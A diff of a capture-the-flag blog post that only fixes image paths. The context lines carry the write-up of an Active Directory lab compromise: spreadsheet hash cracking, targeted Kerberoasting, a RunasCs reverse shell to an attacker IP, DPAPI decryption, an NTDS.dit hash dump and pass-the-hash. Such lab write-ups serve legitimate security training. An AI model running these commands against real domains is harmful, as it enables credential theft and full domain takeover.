@@ -86,7 +86,7 @@ That returns two CNAME records under the authority section which I add to my `/e
 
 Testing them on the SSH server fails and does not accept passwords, so we should be on the lookout for keys applicable here.
 
-![](../assets/img/2026-04-22-Voleur/1.png)
+![](/assets/img/2026-04-22-Voleur/1.png)
 
 ### NTLM Auth Disabled
 Using Netexec to verify these creds over SMB reveals that NTLM authentication has been disabled for this domain. Luckily for us, Netexec/CrackMapExec has a built-in function to use Kerberos auth instead by means of the `-k` flag. We should also sync our machines time to the DC to prevent any clock skew errors.
@@ -104,12 +104,12 @@ $ sudo systemctl disable chronyd 2>/dev/null
 $ sudo rdate -n dc.voleur.htb
 ```
 
-![](../assets/img/2026-04-22-Voleur/2.png)
+![](/assets/img/2026-04-22-Voleur/2.png)
 
 ### IT SMB Share
 After getting that sorted out, we can list the available shares and find that we have read permissions on one of the non-standard ones.
 
-![](../assets/img/2026-04-22-Voleur/3.png)
+![](/assets/img/2026-04-22-Voleur/3.png)
 
 We'll need to setup some other things in order to use Kerberos on other services, so I generate a krb5.conf file and save it under my `/etc` directory for good measure.
 
@@ -124,7 +124,7 @@ $ sudo cp krb5.conf /etc/krb5.conf
 
 I'll use Impacket's [smbclient.py](https://github.com/fortra/impacket/blob/master/examples/smbclient.py) script to connect to the server while specifying the `-k` flag for Kerberos usage.
 
-![](../assets/img/2026-04-22-Voleur/4.png)
+![](/assets/img/2026-04-22-Voleur/4.png)
 
 ### Excel Spreadsheet
 Inside is only an Excel spreadsheet for an access review. Using file against it shows that it's been password-protected, but we can convert it into a crackable format to recover the contents of the file. I also install LibreOffice with the APT package manager in order to open the sheet.
@@ -137,11 +137,11 @@ $ office2john Access_Review.xlsx > xlsxHash
 $ john xlsxHash --wordlist=/opt/seclists/rockyou.txt
 ```
 
-![](../assets/img/2026-04-22-Voleur/5.png)
+![](/assets/img/2026-04-22-Voleur/5.png)
 
 That cracks relatively quick, giving us access to the file's contents. Inside we can find credentials for a user named Todd, who has recently left the organization; This can be confirmed by testing the password which throws an error.
 
-![](../assets/img/2026-04-22-Voleur/6.png)
+![](/assets/img/2026-04-22-Voleur/6.png)
 
 Apart from that dead user account, we now have a ton of information on the domain, including two service account passwords which opens up a few doors for us. This also reveals that Ryan's account does not have Kerberos Pre-Authentication enabled which could've allowed us to AS-REP Roast his account if we hadn't started with credentials.
 
@@ -156,11 +156,11 @@ $ nxc smb dc.voleur.htb -u svc_iis -p '[REDACTED]' -k
 $ bloodhound-python -c all -d voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -ns 10.129.22.212
 ```
 
-![](../assets/img/2026-04-22-Voleur/7.png)
+![](/assets/img/2026-04-22-Voleur/7.png)
 
 Taking some time to let BH ingest the JSON files, I start by looking at what outbound object control permissions that the accounts we control have. A bit of analyzing shows that the _svc_ldap_ account has WriteSPN permissions over the _svc_winrm_ account, meaning we're able to perform a targeted Kerberoasting attack and attempt to crack the NTLM hash offline.
 
-![](../assets/img/2026-04-22-Voleur/8.png)
+![](/assets/img/2026-04-22-Voleur/8.png)
 
 Usually this would be a shot in the dark as service accounts have complex passwords (as seen with the two recovered), but referring back to the Access Control spreadsheet, there was a note disclosing that a support technician recently reset it.
 
@@ -178,7 +178,7 @@ $ bloodyad -d voleur.htb -k -u 'svc_ldap' -p '[REDACTED]' --host dc.voleur.htb s
 
 Next, I start Kerberoasting with Netexec over LDAP, which grants us the TGS for the _svc_winrm_ account. Sending it over to Hashcat or JohnTheRipper rewards us with the cleartext version.
 
-![](../assets/img/2026-04-22-Voleur/9.png)
+![](/assets/img/2026-04-22-Voleur/9.png)
 
 ### Initial Foothold
 In order to authenticate over WinRM, we'll need to generate a ticket for the _svc_winrm_ account with kinit. If these commands are not present on your machine, we can install them with `sudo apt install krb5-user -y` on Kali systems.
@@ -198,14 +198,14 @@ Valid starting       Expires              Service principal
 
 After confirming that we have a ticket with klist, we can grab a shell with via WinRM while specifying the realm with the `-r` flag to match the domain.
 
-![](../assets/img/2026-04-22-Voleur/10.png)
+![](/assets/img/2026-04-22-Voleur/10.png)
 
 At this point we can grab the user flag under their Desktop folder and start looking at ways to escalate privileges towards administrator.
 
 ## Privilege Escalation
 Listing the users directory shows quite a few other accounts, but it doesn't seem like we have access to any of their files, nor do we have any special privileges or permissions.
 
-![](../assets/img/2026-04-22-Voleur/11.png)
+![](/assets/img/2026-04-22-Voleur/11.png)
 
 ### Recovering Deleted User
 Recently I started checking the AD Recycle Bin because of it's presence in other boxes and how difficult it is to spot in BloodHound. Looking back on other account permissions, I discover that _svc_ldap_ is apart of the _Restore_Users_ group so this is a good bet.
@@ -231,7 +231,7 @@ Only problem is that we aren't able to get direct CLI access from _svc_ldap_, so
 $ .\RunasCs.exe svc_ldap [REDACTED] powershell -r 10.10.14.243:443
 ```
 
-![](../assets/img/2026-04-22-Voleur/12.png)
+![](/assets/img/2026-04-22-Voleur/12.png)
 
 Now I'll check what objects have been deleted and are currently in the recycle bin. Because the Active Directory Recycle Bin only marks objects as "deleted" and moves them to a hidden deleted-object container (preserving them for potential recovery), the data still exists in the directory database until it fully expires and is garbage-collected, so it's not immediately or securely removed.
 
@@ -239,7 +239,7 @@ Now I'll check what objects have been deleted and are currently in the recycle b
 $ Get-ADObject -filter 'isDeleted -eq $true-and name -ne "Deleted Objects"' -includeDeletedObjects
 ```
 
-![](../assets/img/2026-04-22-Voleur/13.png)
+![](/assets/img/2026-04-22-Voleur/13.png)
 
 In our case, the aforementioned user that left the organization is still in here, letting us recover his account with the `Restore-ADObject` cmdlet along with the ObjectGUID.
 
@@ -249,7 +249,7 @@ $ Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
 
 Once that's completed, we can repeat the earlier steps with the password found in the spreadsheet to get a shell as _Todd.Wolfe_.
 
-![](../assets/img/2026-04-22-Voleur/14.png)
+![](/assets/img/2026-04-22-Voleur/14.png)
 
 ### Decrypting DPAPI
 Listing group permissions reveals that we are apart of the Second-Line Technicians and can now access a new directory in the IT share. The only thing inside is the deleted home directory for _Todd.Wolfe_, which holds a pair of stored credentials in a hidden AppData folder. I also check the PowerShell history file, but there was nothing of interest within.
@@ -258,7 +258,7 @@ Listing group permissions reveals that we are apart of the Second-Line Technicia
 cd "C:\it\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials"
 ```
 
-![](../assets/img/2026-04-22-Voleur/15.png)
+![](/assets/img/2026-04-22-Voleur/15.png)
 
 A bit of research shows that the master key is available to us under the Protect folder with a matching SID for Todd's account.
 
@@ -266,7 +266,7 @@ A bit of research shows that the master key is available to us under the Protect
 cd "C:\it\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\microsoft\protect\S-1-5-21-3927696377-1337352550-2781715495-1110"
 ```
 
-![](../assets/img/2026-04-22-Voleur/16.png)
+![](/assets/img/2026-04-22-Voleur/16.png)
 
 We can transfer these by uploading [nc.exe](https://github.com/int0x33/nc.exe/) to the machine and utilizing redirection operators, or we can connect to it over SMB as it's already being shared. Note that there is a reset script in place, so we may have to restore the deleted ObjectGUID before grabbing access.
 
@@ -311,24 +311,24 @@ Unknown     : [REDACTED]
 ### WSL Backup Privileges
 This rewards us with domain credentials for _Jeremy.Combs_ and We can generate another Kerberos ticket to get WinRM access, similar to the _svc_winrm_ account earlier. BloodHound shows that this user is in the Third-Line Technicians group, giving him access to that directory on the SMB share.
 
-![](../assets/img/2026-04-22-Voleur/17.png)
+![](/assets/img/2026-04-22-Voleur/17.png)
 
 Looking inside of it grants us an _id_rsa_ private key which can be used to login at the SSH server on port 2222. Judging from the note left, it hosts a Windows Subsystem for Linux that is used to backup files without the need for Windows utilities.
 
-![](../assets/img/2026-04-22-Voleur/18.png)
+![](/assets/img/2026-04-22-Voleur/18.png)
 
 This private key does not work for Jeremy's account, but we did find the _svc_backup_ account listed as a domain user. Attempting to login as them succeeds after giving the file the proper permissions.
 
-![](../assets/img/2026-04-22-Voleur/19.png)
+![](/assets/img/2026-04-22-Voleur/19.png)
 
 Listing Sudo permissions reveals that we have full administrative rights over this subsystem, so we're able to just spawn a root shell right away.
 
-![](../assets/img/2026-04-22-Voleur/20.png)
+![](/assets/img/2026-04-22-Voleur/20.png)
 
 ### Dumping NTDS.dit
 Since this is a backup account for the domain, I check to see what is mounted and discover that we now have unrestricted access to the `C:\` drive. This means we can effectively copy the **NTDS.dit** and **SYSTEM** registry to our local machine in order to dump all domain hashes, including the Administrator's.
 
-![](../assets/img/2026-04-22-Voleur/21.png)
+![](/assets/img/2026-04-22-Voleur/21.png)
 
 Trying to copy from the `C:\Windows\System32\` directory is restricted even though we own it, however there is a backups folder inside of the IT share that we now have access to. This contains both the **NTDS.dit** file and the **SYSTEM** registry needed to decrypt it.
 
@@ -352,7 +352,7 @@ After transferring those to my Kali machine with scp, I use Impacket's [secretsd
 $ impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
 ```
 
-![](../assets/img/2026-04-22-Voleur/22.png)
+![](/assets/img/2026-04-22-Voleur/22.png)
 
 Finally, we can attempt to crack this or utilize it in a Pass-The-Hash attack in order to grab a shell on the domain with full administrative privileges. I end up using WmiExec as to work around the need for Kerberos ticketing.
 
@@ -360,6 +360,6 @@ Finally, we can attempt to crack this or utilize it in a Pass-The-Hash attack in
 $ impacket-wmiexec -hashes ':[REDACTED]' voleur.htb/administrator@dc.voleur.htb -k
 ```
 
-![](../assets/img/2026-04-22-Voleur/23.png)
+![](/assets/img/2026-04-22-Voleur/23.png)
 
 That's all folks, this box was one of my favorites because it covered plenty of topics worth knowing and have gotten me out of a pinch in the past. I hope this was helpful to anyone following along or stuck and happy hacking!
